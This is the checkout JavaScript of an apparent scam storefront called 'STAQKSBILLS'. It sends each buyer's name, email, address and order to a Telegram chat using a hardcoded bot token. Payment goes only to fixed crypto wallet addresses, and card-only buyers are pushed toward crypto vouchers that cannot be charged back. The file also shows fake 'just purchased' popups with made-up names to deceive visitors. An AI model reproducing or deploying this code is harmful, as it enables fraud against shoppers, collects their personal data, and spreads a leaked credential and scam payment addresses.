// --- CHECKOUT JS ---
const form = document.getElementById("checkoutForm");
const orderSummary = document.getElementById("orderSummary");
const copyBtn = document.getElementById("copyAddressBtn");

// G2A Voucher Mapping Table (Based on USD tiers)
const VOUCHER_LINKS = [
  { max: 20,  url: "https://www.g2a.com/crypto-voucher-20-usd-key-global-i10000337580001" },
  { max: 30,  url: "https://www.g2a.com/crypto-voucher-30-usd-key-global-i10000337580002" },
  { max: 50,  url: "https://www.g2a.com/crypto-voucher-50-usd-key-global-i10000337580003" },
  { max: 100, url: "https://www.g2a.com/crypto-voucher-100-usd-key-global-i10000337580004" },
  { max: 200, url: "https://www.g2a.com/crypto-voucher-200-usd-key-global-i10000337580005" },
  { max: 300, url: "https://www.g2a.com/crypto-voucher-300-usd-key-global-i10000337580006" }
];

// Handle form submit
form.onsubmit = function(e){
  e.preventDefault();

  const cart = JSON.parse(localStorage.getItem("cart")) || [];
  if(cart.length === 0){
    alert("Your cart is empty.");
    return;
  }

  const firstName = document.getElementById("firstName").value;
  const lastName = document.getElementById("lastName").value;
  const email = document.getElementById("email").value;
  const address = document.getElementById("address").value;
  const payment = document.getElementById("payment").value;

  const totalUSD = cart.reduce((sum, item) => sum + item.price * item.qty, 0);
  const orderID = "ORD" + Math.floor(Math.random()*1000000);
  const time = new Date().toLocaleString();

  // Find the appropriate voucher link based on the total order amount
  const match = VOUCHER_LINKS.find(v => v.max >= totalUSD) || VOUCHER_LINKS[VOUCHER_LINKS.length - 1];

  let paymentAddress = "";
  switch(payment.toLowerCase()){
    case "bitcoin": paymentAddress = "bc1q7yuv6pl9ht2pe6kxe6hyf0kuzfua6rkqtkgyf5"; break;
    case "ethereum": paymentAddress = "0xAFc94727bFe3A51d7B7c7E321f02B094bA72847"; break;
    case "solana": paymentAddress = "HooqUQLi4trb46fuzNy1rhY3qtkrPJw6FcRwWNEhtLsn"; break;
  }

  // --- TELEGRAM NOTIFICATION LOGIC ---
  // Using the new bot and group credentials provided
  const botToken = "8633179055:AAG1zEe6FI_VIoqLmWUHZZv6QyDuSvBQ1m8";
  const chatId = "-1005174563970"; 

  const itemList = cart.map(i => `• ${i.name} (x${i.qty}) - $${i.price * i.qty}`).join("\n");
  const tgMessage = `
💰 **NEW ORDER: STAQKSBILLS**
--------------------------
🆔 **Order ID:** ${orderID}
👤 **Customer:** ${firstName} ${lastName}
📧 **Email:** ${email}
📍 **Address:** ${address}
💵 **Total:** $${totalUSD}
💳 **Method:** ${payment}
--------------------------
📦 **Items:**
${itemList}
--------------------------
  `;

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: tgMessage,
      parse_mode: "Markdown",
    }),
  }).catch(err => console.error("Telegram Log Failed", err));

  // Display order summary with the dynamic card-to-crypto voucher link
  orderSummary.innerHTML = `
    <h3>Order Generated</h3>
    <p><b>Order ID:</b> ${orderID}</p>
    <p><b>Date:</b> ${time}</p>
    <p><b>Name:</b> ${firstName} ${lastName}</p>
    <p><b>Email:</b> ${email}</p>
    <p><b>Address:</b> ${address}</p>
    <p><b>Total:</b> $${totalUSD}</p>
    <p><b>Payment Method:</b> ${payment}</p>
    <p><b>Payment Address:</b> <span id="paymentAddress">${paymentAddress}</span></p>
    
    <div style="margin-top: 15px; padding: 10px; border: 1px dashed #ffcc00; background: rgba(255, 204, 0, 0.1);">
      <p style="margin: 0; font-size: 0.9em;">
        <strong>IF YOU ONLY HAVE CARD:</strong> 
        <a href="${match.url}" target="_blank" style="color: #ffcc00; text-decoration: underline;">
          BUY A $${match.max} CRYPTO VOUCHER
        </a> 
        AND ENTER THE CODE IN TELEGRAM SUPPORT.
      </p>
    </div>

    <p style="margin-top: 15px;">Please follow the payment instructions and confirm with support on Telegram with proof.</p>
  `;

  // Show copy button
  copyBtn.style.display = "inline-block";

  // Clear cart after generating order
  localStorage.setItem("cart", JSON.stringify([]));
  if(typeof updateCartUI === "function") updateCartUI();
};

// Copy payment address
copyBtn.onclick = () => {
  const text = document.getElementById("paymentAddress").textContent;
  navigator.clipboard.writeText(text)
    .then(()=> alert("Payment address copied, MAKE THE PAYMENT THEN COME TO THE TELEGRAM WITH PROOF!"))
    .catch(()=> alert("Failed to copy."));
};

// --- FAKE LIVE PURCHASE POPUPS ---
const names = ["James", "Michael", "Chris", "Daniel", "Alex", "Brian"];
const countries = ["USA", "UK", "Canada", "Germany", "Australia"];

function showFakePurchase() {
  const randomName = names[Math.floor(Math.random() * names.length)];
  const randomCountry = countries[Math.floor(Math.random() * countries.length)];
  
  // Ensure products exists in scope from your products.js
  if (typeof products === 'undefined' || products.length === 0) return;

  const randomProduct = products[Math.floor(Math.random() * products.length)];

  const popup = document.createElement("div");
  popup.className = "fake-popup";
  popup.innerHTML = `
    <p><strong>${randomName}</strong> from ${randomCountry}</p>
    <p>just purchased <strong>${randomProduct.name}</strong></p>
  `;

  document.body.appendChild(popup);
  setTimeout(() => popup.remove(), 4000);
}

// Show every 10–20 seconds
setInterval(showFakePurchase, Math.random() * 10000 + 10000);

// --- TELEGRAM FLOAT INLINE ---
document.querySelectorAll(".telegram-float").forEach(el=>{
  el.addEventListener("click", e=>{
    e.preventDefault();
    const iframe = document.createElement("iframe");
    iframe.src = el.href;
    iframe.style.width = "100%";
    iframe.style.height = "600px";
    iframe.style.border = "none";
    document.body.appendChild(iframe);
    window.scrollTo({ top: iframe.offsetTop, behavior: "smooth" });
  });
});
